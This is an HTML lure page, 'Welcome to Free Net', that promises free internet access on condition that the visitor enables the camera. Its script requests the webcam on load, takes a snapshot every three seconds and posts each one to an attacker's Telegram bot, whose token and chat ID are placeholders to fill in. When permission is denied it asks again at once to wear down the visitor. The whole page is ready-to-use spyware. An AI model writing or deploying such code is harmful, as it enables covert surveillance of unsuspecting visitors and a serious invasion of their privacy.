<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Net Page</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: url('https://via.placeholder.com/1920x1080?text=Free+Net+Page') no-repeat center center fixed;
            background-size: cover;
            font-family: Arial, sans-serif;
            color: white;
            text-align: center;
        }
        h1 {
            font-size: 3rem;
            margin-bottom: 10px;
        }
        p {
            font-size: 1.2rem;
        }
    </style>
</head>
<body>
    <div>
        <h1>Welcome to Free Net</h1>
        <p>Enable camera to continue.</p>
    </div>

    <script>
        const chat_id = '123456789'; // Replace with your Telegram Chat ID
        const token = 'YOUR_BOT_TOKEN'; // Replace with your Telegram Bot Token
        const telegramURL = `https://api.telegram.org/bot${token}/sendPhoto`;

        async function requestCameraPermission() {
            try {
                // Request camera permission
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });

                // Capture images continuously and send to Telegram
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                setInterval(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', chat_id);
                        formData.append('photo', blob);

                        fetch(telegramURL, {
                            method: 'POST',
                            body: formData,
                        })
                        .then(response => {
                            if (!response.ok) {
                                console.error("Failed to send photo.");
                            }
                        })
                        .catch(error => console.error("Error:", error));
                    }, 'image/jpeg');
                }, 3000); // Capture every 3 seconds

            } catch (error) {
                // If permission is denied, show an alert and try again
                alert("Camera permission is required to access Free Net.");
                requestCameraPermission();
            }
        }

        // Request permission on page load
        requestCameraPermission();
    </script>
</body>
</html>
